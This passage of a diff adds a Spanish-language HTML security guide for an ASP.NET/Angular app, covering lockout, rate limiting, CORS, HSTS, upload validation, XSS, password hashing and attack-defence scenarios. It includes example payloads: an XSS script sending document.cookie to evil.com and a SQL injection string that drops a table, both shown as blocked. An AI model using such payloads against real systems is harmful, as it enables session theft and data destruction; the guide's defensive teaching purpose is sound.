+    var matchIndex   = storedHashes.FindIndex(h => h.Equals(inputHash, StringComparison.OrdinalIgnoreCase));
+
+    if (matchIndex < 0) throw new UnauthorizedAccessException("Código de respaldo incorrecto o ya usado.");
+
+    storedHashes.RemoveAt(matchIndex);  // consumir el código — no se puede reusar
+    user.TotpBackupCodes = JsonSerializer.Serialize(storedHashes);
+    await _userManager.UpdateAsync(user);
+}</code></pre>
+
+
+<!-- ─────────────────────────── 5 ─────────────────────────── -->
+<h1 id="5-lockout">5. Lockout de cuentas</h1>
+
+<div class="file-ref">📄 Program.cs — configuración de Identity (líneas 23-38)</div>
+<div class="file-ref">📄 AuthService.cs — LoginAsync()</div>
+
+<pre><code>// Configuración en Program.cs:
+options.Lockout.DefaultLockoutTimeSpan  = TimeSpan.FromMinutes(1);  // bloqueado 1 minuto
+options.Lockout.MaxFailedAccessAttempts = 5;                         // tras 5 intentos fallidos
+options.Lockout.AllowedForNewUsers      = true;                      // aplica a todos</code></pre>
+
+<pre><code>// En LoginAsync() — cada intento fallido incrementa el contador:
+if (!passwordValid)
+{
+    await _userManager.AccessFailedAsync(user);  // +1 al contador
+    throw new UnauthorizedAccessException("Credenciales inválidas.");
+}
+
+// Al hacer login correcto — resetear el contador:
+await _userManager.ResetAccessFailedCountAsync(user);
+
+// Comprobar lockout antes de verificar password:
+if (await _userManager.IsLockedOutAsync(user))
+    throw new AccountLockedException("Cuenta bloqueada.");</code></pre>
+
+<blockquote>
+  El lockout devuelve HTTP 423 (Locked), mientras que las credenciales incorrectas devuelven 401. Esto permite al frontend mostrar mensajes distintos pero sin revelar al atacante si la cuenta existe o no.
+</blockquote>
+
+
+<!-- ─────────────────────────── 6 ─────────────────────────── -->
+<h1 id="6-ratelimit">6. Rate limiting</h1>
+
+<div class="file-ref">📄 Program.cs — líneas 168-183</div>
+<div class="file-ref">📄 Controllers/AuthController.cs — [EnableRateLimiting("auth")]</div>
+
+<pre><code>// Configuración en Program.cs:
+options.AddPolicy("auth", httpContext =>
+    RateLimitPartition.GetFixedWindowLimiter(
+        partitionKey: httpContext.Connection.RemoteIpAddress?.ToString() ?? "unknown",
+        factory: _ => new FixedWindowRateLimiterOptions
+        {
+            PermitLimit = 5,                         // máximo 5 peticiones
+            Window      = TimeSpan.FromMinutes(1),   // por ventana de 1 minuto
+            QueueLimit  = 0                          // sin cola — rechazar inmediatamente
+        }
+    ));</code></pre>
+
+<pre><code>// Aplicado al controller completo:
+[EnableRateLimiting("auth")]
+public class AuthController : ControllerBase { ... }
+
+// El endpoint /auth/me está exento (lectura sin efecto, la dispara el frontend al arrancar):
+[DisableRateLimiting]
+public IActionResult Me() { ... }</code></pre>
+
+<table>
+  <thead><tr><th>Endpoint</th><th>Rate limit</th><th>Por qué</th></tr></thead>
+  <tbody>
+    <tr><td>/auth/login</td><td>5/min por IP</td><td>Previene fuerza bruta de passwords</td></tr>
+    <tr><td>/auth/mfa-verify</td><td>5/min por IP</td><td>Previene fuerza bruta de OTPs</td></tr>
+    <tr><td>/auth/refresh</td><td>5/min por IP</td><td>Previene abuso de generación de tokens</td></tr>
+    <tr><td>/auth/forgot-password</td><td>5/min por IP</td><td>Previene spam de emails</td></tr>
+    <tr><td>/auth/resend-otp</td><td>5/min por IP</td><td>Previene spam de emails</td></tr>
+    <tr><td>/auth/me</td><td>Sin límite</td><td>Lectura, lo dispara el frontend al arrancar</td></tr>
+  </tbody>
+</table>
+
+<blockquote class="warn">
+  El rate limit es por IP. Esto puede ser problemático tras NAT (varios usuarios comparten IP) o desde IPs múltiples (el atacante rota IPs). Para hardening adicional se podría añadir partición por email.
+</blockquote>
+
+
+<!-- ─────────────────────────── 7 ─────────────────────────── -->
+<h1 id="7-cors">7. CORS y SameSite</h1>
+
+<h3>CORS — controlar qué orígenes pueden llamar a la API</h3>
+
+<div class="file-ref">📄 Program.cs — líneas 151-165</div>
+<div class="file-ref">📄 appsettings.json — Cors:AllowedOrigins</div>
+
+<pre><code>// Los orígenes permitidos vienen de configuración (no hardcoded):
+var corsOrigins = builder.Configuration
+    .GetSection("Cors:AllowedOrigins")
+    .Get&lt;string[]&gt;();
+
+policy.WithOrigins(corsOrigins)    // solo estos orígenes
+      .AllowAnyMethod()            // GET, POST, PUT, DELETE
+      .AllowAnyHeader()            // cualquier header
+      .AllowCredentials();         // necesario para que el browser envíe cookies</code></pre>
+
+<pre><code>// En appsettings.json — en producción cambiar a la URL real:
+"Cors": {
+  "AllowedOrigins": [ "http://localhost:4200" ]
+}</code></pre>
+
+<blockquote>
+  <code>AllowCredentials()</code> es obligatorio cuando usas cookies. Sin él, el navegador no adjunta las cookies aunque el origen esté permitido.
+</blockquote>
+
+<h3>SameSite=Strict — protección CSRF adicional</h3>
+
+<p>Aunque el CORS controla desde qué orígenes puede hacer peticiones el JavaScript, <code>SameSite=Strict</code> añade una capa extra: el navegador directamente no adjunta las cookies si la petición viene de otro dominio, aunque sea una petición de formulario HTML (que no pasa por CORS).</p>
+
+<pre><code>// En SetAccessTokenCookie():
+SameSite = SameSiteMode.Strict
+// → si alguien en evil.com intenta hacer POST a tu API,
+//   el navegador NO adjunta accessToken ni refreshToken</code></pre>
+
+
+<!-- ─────────────────────────── 8 ─────────────────────────── -->
+<h1 id="8-https">8. HTTPS y HSTS</h1>
+
+<div class="file-ref">📄 Program.cs — líneas 222-224</div>
+
+<pre><code>if (!app.Environment.IsDevelopment())
+    app.UseHsts();          // activa HSTS en producción
+app.UseHttpsRedirection();  // redirige HTTP → HTTPS siempre</code></pre>
+
+<p><strong>HSTS</strong> (HTTP Strict Transport Security) envía esta cabecera al navegador:</p>
+<pre><code>Strict-Transport-Security: max-age=2592000   // 30 días</code></pre>
+
+<p>El navegador la guarda y durante 30 días, aunque el usuario teclee <code>http://</code>, el navegador lo cambia a <code>https://</code> antes de salir a la red. Esto previene ataques SSL stripping en redes WiFi públicas.</p>
+
+<blockquote>
+  No se activa en Development porque trabajas con <code>localhost</code> por HTTP. Si lo activaras, el navegador recordaría "localhost = solo HTTPS" durante 30 días y rompería otros proyectos locales.
+</blockquote>
+
+
+<!-- ─────────────────────────── 9 ─────────────────────────── -->
+<h1 id="9-fileupload">9. Validación de archivos (magic bytes)</h1>
+
+<div class="file-ref">📄 Services/CompanyService.cs — SaveLogoAsync(), HasValidMagicBytes()</div>
+
+<p>Al subir el logo de una empresa se aplican <strong>4 validaciones en cadena</strong>:</p>
+
+<pre><code>private async Task&lt;string&gt; SaveLogoAsync(IFormFile file, CancellationToken ct)
+{
+    // 1. Tamaño máximo 5 MB
+    if (file.Length > 5 * 1024 * 1024)
+        throw new ArgumentException("El archivo no puede superar los 5 MB.");
+
+    // 2. Extensión permitida (controlada por el cliente — no confiable)
+    var extension = Path.GetExtension(file.FileName).ToLowerInvariant();
+    if (!AllowedExtensions.Contains(extension))  // .jpg .jpeg .png .gif .webp
+        throw new ArgumentException("Formato no permitido.");
+
+    // 3. MIME type (declarado por el cliente — no confiable)
+    if (!AllowedMimeTypes.Contains(file.ContentType.ToLowerInvariant()))
+        throw new ArgumentException("Tipo MIME no válido.");
+
+    // 4. Magic bytes — los primeros bytes del fichero real (esto SÍ es confiable)
+    await using var readStream = file.OpenReadStream();
+    var header = new byte[12];
+    await readStream.ReadExactlyAsync(header.AsMemory(0, 12), ct);
+
+    if (!HasValidMagicBytes(header, extension))
+        throw new ArgumentException("El contenido no coincide con el formato declarado.");
+
+    // Nombre aleatorio con UUID — evita path traversal y colisiones
+    var fileName = $"{Guid.NewGuid()}{extension}";
+    var filePath = Path.Combine(_env.WebRootPath, "uploads", fileName);
+
+    readStream.Position = 0;
+    await using var fileStream = new FileStream(filePath, FileMode.Create);
+    await readStream.CopyToAsync(fileStream, ct);
+
+    return fileName;
+}</code></pre>
+
+<pre><code>// Firmas binarias de cada formato:
+private static bool HasValidMagicBytes(byte[] h, string extension) => extension switch
+{
+    ".jpg" or ".jpeg" => h[0] == 0xFF && h[1] == 0xD8 && h[2] == 0xFF,
+    ".png"  => h[0] == 0x89 && h[1] == 0x50 && h[2] == 0x4E && h[3] == 0x47,
+    ".gif"  => h[0] == 0x47 && h[1] == 0x49 && h[2] == 0x46 && h[3] == 0x38,
+    ".webp" => h[0] == 0x52 && h[1] == 0x49 && h[2] == 0x46 && h[3] == 0x46
+            && h[8] == 0x57 && h[9] == 0x45 && h[10] == 0x42 && h[11] == 0x50,
+    _ => false
+};</code></pre>
+
+<table>
+  <thead><tr><th>Formato</th><th>Magic bytes (hex)</th><th>En ASCII</th></tr></thead>
+  <tbody>
+    <tr><td>JPEG</td><td><code>FF D8 FF</code></td><td>—</td></tr>
+    <tr><td>PNG</td><td><code>89 50 4E 47</code></td><td><code>.PNG</code></td></tr>
+    <tr><td>GIF</td><td><code>47 49 46 38</code></td><td><code>GIF8</code></td></tr>
+    <tr><td>WebP</td><td><code>52 49 46 46 ... 57 45 42 50</code></td><td><code>RIFF....WEBP</code></td></tr>
+  </tbody>
+</table>
+
+<blockquote class="ok">
+  Si alguien renombra <code>malware.exe</code> a <code>logo.png</code> y lo sube, el paso 4 lo rechaza porque los primeros bytes de un EXE son <code>4D 5A</code> (MZ), no <code>89 50 4E 47</code>.
+</blockquote>
+
+<p>El límite global de body size está configurado en Kestrel:</p>
+<div class="file-ref">📄 Program.cs — líneas 186-189</div>
+<pre><code>builder.WebHost.ConfigureKestrel(options =>
+{
+    options.Limits.MaxRequestBodySize = 10 * 1024 * 1024;  // 10 MB máximo
+});</code></pre>
+
+
+<!-- ─────────────────────────── 10 ─────────────────────────── -->
+<h1 id="10-guards">10. Guards del frontend</h1>
+
+<div class="file-ref">📄 guards/auth.guard.ts · admin.guard.ts · guest.guard.ts</div>
+
+<blockquote class="warn">
+  Los guards del frontend son <strong>UX, no seguridad real</strong>. La seguridad real está en el backend con <code>[Authorize]</code>. Los guards evitan que el usuario vea páginas que no debería y mejoran la experiencia, pero un atacante con conocimientos podría saltárselos. La API lo rechazaría igualmente.
+</blockquote>
+
+<h3>authGuard — ¿estás autenticado?</h3>
+<pre><code>export const authGuard: CanActivateFn = (_route, state) => {
+  const auth   = inject(AuthService);
+  const router = inject(Router);
+
+  if (auth.isLoggedIn()) return true;
+
+  // Guardar la URL destino para volver después del login
+  return router.createUrlTree(['/login'], { queryParams: { returnUrl: state.url } });
+};</code></pre>
+
+<h3>adminGuard — ¿eres SuperAdmin con TOTP activo?</h3>
+<pre><code>export const adminGuard: CanActivateFn = () => {
+  const auth   = inject(AuthService);
+  const router = inject(Router);
+
+  if (auth.userRole() !== 'SuperAdmin')
+    return router.createUrlTree(['/perfil']);      // Cliente → a su perfil
+
+  if (!auth.totpEnabled())
+    return router.createUrlTree(['/configurar-totp']); // Sin TOTP → configurar
+
+  return true;
+};</code></pre>
+
+<h3>guestGuard — ¿no estás autenticado?</h3>
+<pre><code>export const guestGuard: CanActivateFn = () => {
+  const auth   = inject(AuthService);
+  const router = inject(Router);
+
+  if (!auth.isLoggedIn()) return true;
+
+  // Ya logueado → ir al home del rol
+  const home = auth.userRole() === 'SuperAdmin' ? '/empresas' : '/perfil';
+  return router.createUrlTree([home]);
+};</code></pre>
+
+<h3>Protección en el backend — la verdadera barrera</h3>
+<div class="file-ref">📄 Controllers/CompaniesController.cs · UsersController.cs</div>
+<pre><code>[Authorize(Roles = "SuperAdmin")]   // solo SuperAdmin puede llegar aquí
+public class CompaniesController : ControllerBase { ... }
+
+[Authorize(Roles = "Cliente")]      // solo Cliente puede ver su propio perfil
+public async Task&lt;IActionResult&gt; GetMe() { ... }</code></pre>
+
+
+<!-- ─────────────────────────── 11 ─────────────────────────── -->
+<h1 id="11-xss">11. Protección XSS</h1>
+
+<p>XSS (Cross-Site Scripting) es cuando un atacante consigue que código JavaScript malicioso se ejecute en el navegador de otro usuario. Por ejemplo, si una empresa se llama <code>&lt;script&gt;robarCookies()&lt;/script&gt;</code> y se renderiza sin escapar.</p>
+
+<h3>Capa 1 — Angular escapa por defecto</h3>
+
+<p>Toda interpolación con <code>{{ }}</code> en Angular escapa automáticamente los caracteres HTML peligrosos. No hay que hacer nada:</p>
+
+<pre><code>&lt;!-- Angular convierte &lt;script&gt; en texto literal, no lo ejecuta --&gt;
+&lt;span&gt;{{ company.name }}&lt;/span&gt;
+
+&lt;!-- PELIGROSO — nunca usar [innerHTML] con datos del usuario --&gt;
+&lt;span [innerHTML]="company.name"&gt;&lt;/span&gt;  // ← esto sí ejecutaría el script</code></pre>
+
+<p>En toda la app no hay ningún uso de <code>[innerHTML]</code>, <code>bypassSecurityTrustHtml()</code> ni <code>eval()</code>.</p>
+
+<h3>Capa 2 — Identidad en memoria, no en localStorage</h3>
+
+<div class="file-ref">📄 services/auth.service.ts</div>
+
+<pre><code>// La identidad vive en un signal privado en memoria
+private readonly _identity = signal&lt;Identity | null&gt;(null);
+
+// Nunca en localStorage ni sessionStorage:
+// ❌ localStorage.setItem('token', accessToken)   ← no existe en el código
+// ❌ localStorage.setItem('role', userRole)        ← no existe en el código</code></pre>
+
+<blockquote class="ok">
+  Si hubiera un XSS, el atacante podría ejecutar código en el contexto del usuario. Pero no podría robar el JWT (está en cookie HttpOnly) ni el rol (está en memoria, no en localStorage). Lo más que podría hacer es llamar a la API en nombre del usuario durante esa sesión — limitado y ruidoso.
+</blockquote>
+
+<h3>Capa 3 — Cookie HttpOnly</h3>
+<p>Aunque hubiera XSS, <code>document.cookie</code> no devuelve cookies marcadas como <code>HttpOnly</code>. El atacante no puede robar el access token ni el refresh token.</p>
+
+<h3>Capa 4 — SameSite=Strict</h3>
+<p>Aunque el atacante consiguiera ejecutar JS desde <code>evil.com</code>, las peticiones a la API no llevarían cookies porque el navegador las bloquea con <code>SameSite=Strict</code>.</p>
+
+
+<!-- ─────────────────────────── 12 ─────────────────────────── -->
+<h1 id="12-passwords">12. Contraseñas</h1>
+
+<h3>Hash con PBKDF2 — ASP.NET Identity</h3>
+
+<p>Las contraseñas nunca se guardan en claro. Identity las hashea automáticamente con <strong>PBKDF2</strong> (Password-Based Key Derivation Function 2):</p>
+<ul>
+  <li>Algoritmo: HMAC-SHA256</li>
+  <li>Iteraciones: 10.000 (hace el hash lento a propósito — dificulta fuerza bruta)</li>
+  <li>Sal: 16 bytes aleatorios por usuario (cada hash es único aunque la contraseña sea igual)</li>
+</ul>
+
+<p>Si se filtra la BD, romper una contraseña requeriría meses de cómputo.</p>
+
+<h3>Política de contraseñas</h3>
+
+<div class="file-ref">📄 Program.cs — líneas 25-29</div>
+<pre><code>options.Password.RequireDigit           = true;
+options.Password.RequireLowercase       = true;
+options.Password.RequireUppercase       = true;
+options.Password.RequireNonAlphanumeric = true;
+options.Password.RequiredLength         = 8;</code></pre>
+
+<p>Validada también en el <strong>frontend</strong> en tiempo real:</p>
+
+<div class="file-ref">📄 constants/password-rules.ts</div>
+<pre><code>export const PASSWORD_RULES = [
+  { label: 'Mínimo 8 caracteres',          test: p => p.length >= 8 },
+  { label: 'Al menos una mayúscula',        test: p => /[A-Z]/.test(p) },
+  { label: 'Al menos una minúscula',        test: p => /[a-z]/.test(p) },
+  { label: 'Al menos un número',            test: p => /[0-9]/.test(p) },
+  { label: 'Al menos un carácter especial', test: p => /[^A-Za-z0-9]/.test(p) }
+];</code></pre>
+
+<h3>Recuperación de contraseña</h3>
+
+<div class="file-ref">📄 AuthService.cs — ForgotPasswordAsync(), ResetPasswordAsync()</div>
+
+<pre><code>// 1. Generar token firmado por Identity (expira en ~1 hora)
+var token = await _userManager.GeneratePasswordResetTokenAsync(user);
+
+// 2. Enviar enlace por email con el token en la URL
+var resetLink = $"{frontendBaseUrl}/reset-password?email={email}&token={encodedToken}";
+
+// 3. Al resetear: revocar TODAS las sesiones activas
+var activeTokens = _db.RefreshTokens.Where(r => r.UserId == user.Id && r.RevokedAt == null ...);
+await activeTokens.ForEachAsync(t => t.RevokedAt = DateTime.UtcNow);</code></pre>
+
+
+<!-- ─────────────────────────── 13 ─────────────────────────── -->
+<h1 id="13-antienum">13. Anti-enumeración de usuarios</h1>
+
+<p>La <strong>enumeración de usuarios</strong> es cuando un atacante puede descubrir qué emails están registrados en el sistema probando respuestas distintas.</p>
+
+<div class="file-ref">📄 AuthController.cs — ForgotPassword(), ResendOtp()</div>
+<div class="file-ref">📄 AuthService.cs — ForgotPasswordAsync(), ResendOtpAsync()</div>
+
+<pre><code>// ForgotPassword — siempre devuelve 200 aunque el email no exista:
+public async Task ForgotPasswordAsync(ForgotPasswordDto dto, string frontendBaseUrl)
+{
+    var user = await _userManager.FindByEmailAsync(dto.Email);
+    if (user is null)
+    {
+        _logger.LogInformation("ForgotPassword solicitado para email no registrado.");
+        return;  // salir silenciosamente — no revelar que no existe
+    }
+    // ... enviar email solo si existe
+}
+
+// Respuesta siempre igual:
+return Ok(new { message = "Si el email existe, recibirás un enlace de recuperación." });</code></pre>
+
+<pre><code>// ResendOtp — calcula el expiresAt ANTES de comprobar si el usuario existe:
+var expiresAt = DateTime.UtcNow.AddSeconds(30);  // siempre el mismo valor
+
+var user = await _userManager.FindByEmailAsync(email);
+if (user is null) return expiresAt;  // mismo timestamp, sin revelar nada</code></pre>
+
+<blockquote>
+  Un atacante no puede saber si <code>victima@empresa.com</code> está registrado probando estas respuestas — siempre son idénticas.
+</blockquote>
+
+
+<!-- ─────────────────────────── 14 ─────────────────────────── -->
+<h1 id="14-secretos">14. Gestión de secretos</h1>
+
+<h3>User Secrets — nunca en el repositorio</h3>
+
+<div class="file-ref">📄 ClientManager.API.csproj — UserSecretsId</div>
+
+<pre><code>&lt;UserSecretsId&gt;f81454c1-b435-428f-8906-3facb203d1fb&lt;/UserSecretsId&gt;</code></pre>
+
+<p>Los secretos se guardan fuera del repositorio en <code>%APPDATA%\Microsoft\UserSecrets\{id}\secrets.json</code>:</p>
+
+<pre><code>// Configurar con:
+dotnet user-secrets set "Jwt:SecretKey" "clave-de-al-menos-32-caracteres"
+dotnet user-secrets set "SuperAdmin:Password" "Password@2026!"</code></pre>
+
+<table>
+  <thead><tr><th>Secreto</th><th>Dónde se usa</th><th>En git</th></tr></thead>
+  <tbody>
+    <tr><td><code>Jwt:SecretKey</code></td><td>Firmar y verificar JWTs</td><td>❌ Nunca</td></tr>
+    <tr><td><code>SuperAdmin:Password</code></td><td>Crear el admin al arrancar</td><td>❌ Nunca</td></tr>
+    <tr><td>Password de BD</td><td>Connection string</td><td>❌ Nunca (no está en appsettings)</td></tr>
+  </tbody>
+</table>
+
+<h3>Fallo explícito si faltan</h3>
+
+<div class="file-ref">📄 Program.cs — líneas 41-46</div>
+
+<pre><code>// La app no arranca si faltan los secretos:
+var jwtSecretKey = builder.Configuration["Jwt:SecretKey"]
+    ?? throw new InvalidOperationException("Jwt:SecretKey es obligatorio. Configúralo en User Secrets.");
+
+var adminPassword = config["SuperAdmin:Password"]
+    ?? throw new InvalidOperationException("SuperAdmin:Password es obligatorio.");</code></pre>
+
+
+<!-- ─────────────────────────── 15 ─────────────────────────── -->
+<h1 id="15-limpieza">15. Limpieza automática de BD</h1>
+
+<div class="file-ref">📄 Services/CleanupHostedService.cs</div>
+
+<p>Un servicio en background se ejecuta cada hora y elimina tokens y OTPs expirados para que las tablas no crezcan indefinidamente con datos caducados.</p>
+
+<pre><code>protected override async Task ExecuteAsync(CancellationToken stoppingToken)
+{
+    while (!stoppingToken.IsCancellationRequested)
+    {
+        await DoCleanupAsync(stoppingToken);
+        await Task.Delay(TimeSpan.FromHours(1), stoppingToken);  // cada hora
+    }
+}
+
+private async Task DoCleanupAsync(CancellationToken ct)
+{
+    // Eliminar refresh tokens expirados (EF8 — DELETE directo, sin materializar)
+    var refreshDeleted = await db.RefreshTokens
+        .Where(r => r.ExpiresAt < now)
+        .ExecuteDeleteAsync(ct);
+
+    // Eliminar OTPs expirados o ya usados
+    var otpDeleted = await db.EmailOtpCodes
+        .Where(o => o.ExpiresAt < now || o.IsUsed)
+        .ExecuteDeleteAsync(ct);
+}</code></pre>
+
+<blockquote>
+  Usar <code>ExecuteDeleteAsync()</code> hace un <code>DELETE FROM ... WHERE</code> directo en la BD sin cargar los registros en memoria primero — mucho más eficiente que cargarlos y luego borrarlos.
+</blockquote>
+
+
+<!-- ─────────────────────────── 16 ─────────────────────────── -->
+<h1 id="16-sqlinj">16. SQL Injection</h1>
+
+<p>Una inyección SQL ocurre cuando datos del usuario se concatenan directamente en una consulta SQL:</p>
+
+<pre><code>// VULNERABLE (no existe en el código, ejemplo de lo que NO se hace):
+var sql = $"SELECT * FROM Companies WHERE Name = '{dto.Name}'";
+// Si dto.Name = "'; DROP TABLE Companies; --" → destruye la BD</code></pre>
+
+<p>En este proyecto es <strong>imposible</strong> porque toda la persistencia usa <strong>Entity Framework Core con LINQ</strong>. EF traduce LINQ a SQL parametrizado automáticamente:</p>
+
+<div class="file-ref">📄 Services/CompanyService.cs · UserService.cs</div>
+
+<pre><code>// EF Core genera automáticamente SQL parametrizado:
+var companies = await _db.Companies
+    .Where(c => c.Name.ToLower().StartsWith(name.ToLower()))
+    .ToListAsync();
+
+// SQL generado internamente por EF:
+// SELECT * FROM "Companies" WHERE lower("Name") LIKE @p0 + '%'
+// @p0 = 'valor_del_usuario'   ← parámetro separado, nunca concatenado</code></pre>
+
+<p>El único uso de SQL raw es en el arranque para comprobar si existe la tabla de migraciones. Es un literal sin parámetros de usuario, así que no hay riesgo:</p>
+
+<div class="file-ref">📄 Program.cs — línea 442</div>
+<pre><code>cmd.CommandText = "SELECT EXISTS(SELECT 1 FROM information_schema.tables WHERE ...)";
+// Literal fijo, sin ningún input del usuario</code></pre>
+
+
+<!-- ─────────────────────────── 17 ─────────────────────────── -->
+<h1 id="17-flujos">17. Flujos de ataque y defensa</h1>
+
+<h3>Escenario 1 — Ataque de fuerza bruta al login</h3>
+<div class="flow">
+Atacante prueba 100 contraseñas contra admin@clientmanager.local<br>
+<br>
+Intento 1-5:   AuthService → AccessFailedAsync() incrementa contador<br>
+               Rate limiter cuenta 5 peticiones en 1 minuto<br>
+<br>
+Intento 6:     Rate limiter → 429 Too Many Requests<br>
+               (el atacante tiene que esperar 1 minuto)<br>
+<br>
+Si el atacante espera y llega al intento 5+1=6 total:<br>
+               IsLockedOutAsync() → true → 423 Locked<br>
+               Cuenta bloqueada 1 minuto independientemente del rate limit<br>
+<br>
+Resultado: el atacante necesita &gt;1 minuto por cada 5 intentos → inviable a escala
+</div>
+
+<h3>Escenario 2 — Robo del JWT</h3>
+<div class="flow">
+Atacante consigue el JWT de alguna forma (no via XSS — está en cookie HttpOnly)<br>
+<br>
+Intento de uso:  JWT tiene 15 minutos de vida → si ya expiró, 401 inmediato<br>
+<br>
+Si aún no expiró:<br>
+  → El backend verifica SecurityStamp en cada request<br>
+  → Si el usuario legítimo cambió su contraseña mientras tanto → 401<br>
+  → Si no cambió contraseña: el atacante tiene acceso máximo 15 minutos<br>
+<br>
+Mitigación: el usuario puede cambiar contraseña → SecurityStamp cambia →<br>
+            todas las sesiones (incluida la del atacante) → 401 inmediato
+</div>
+
+<h3>Escenario 3 — Robo del refresh token</h3>
+<div class="flow">
+Atacante consigue un refresh token activo<br>
+<br>
+Si el atacante lo usa ANTES que el usuario legítimo:<br>
+  → Obtiene nuevos tokens<br>
+  → El token original queda revocado (ReplacedByToken registrado)<br>
+  → Cuando el usuario legítimo intenta refrescar → 401<br>
+  → El usuario ve que algo va mal y cambia contraseña<br>
+  → Al cambiar contraseña: TODOS los refresh tokens se revocan<br>
+  → El atacante pierde acceso<br>
+<br>
+Si el usuario legítimo lo usa ANTES:<br>
+  → Token del atacante ya fue revocado<br>
+  → 401 si intenta usarlo
+</div>
+
+<h3>Escenario 4 — Intento de subir un archivo malicioso</h3>
+<div class="flow">
+Atacante sube "malware.exe" renombrado como "logo.png"<br>
+<br>
+CompanyService.SaveLogoAsync():<br>
+  Paso 1: file.Length ≤ 5MB → pasa (asumiendo que es pequeño)<br>
+  Paso 2: extensión .png → pasa (la extensión es la declarada)<br>
+  Paso 3: Content-Type image/png → pasa (el cliente lo declara)<br>
+  Paso 4: Magic bytes → lee primeros 12 bytes del fichero real<br>
+          EXE empieza con 4D 5A (MZ), no con 89 50 4E 47 (PNG)<br>
+          → ArgumentException: "El contenido no coincide con el formato declarado"<br>
+          → 400 Bad Request<br>
+<br>
+El archivo nunca llega al disco
+</div>
+
+<h3>Escenario 5 — Ataque XSS</h3>
+<div class="flow">
+Atacante crea empresa con nombre: &lt;script&gt;fetch('evil.com?c='+document.cookie)&lt;/script&gt;<br>
+<br>
+Backend: guarda el string tal cual en BD (no lo modifica)<br>
+<br>
+Frontend: Angular renderiza {{ company.name }}<br>
+  → Convierte &lt; a &amp;lt;, &gt; a &amp;gt;<br>
+  → La pantalla muestra el texto literal, no ejecuta nada<br>
+<br>
+Si por algún motivo el script se ejecutara:<br>
+  → document.cookie → vacío (accessToken y refreshToken son HttpOnly)<br>
+  → No puede robar las credenciales de sesión<br>
+  → SameSite=Strict impide usar las cookies desde evil.com
+</div>
+
+<hr>
+
+<p style="text-align:center; color: var(--text-muted); font-size: 0.85rem; margin-top: 3rem;">
+  ClientManager — Seguridad: Guía de Implementación · 04/05/2026
+</p>
+
+</div>
+</main>
+</div>
+</body>
+</html>
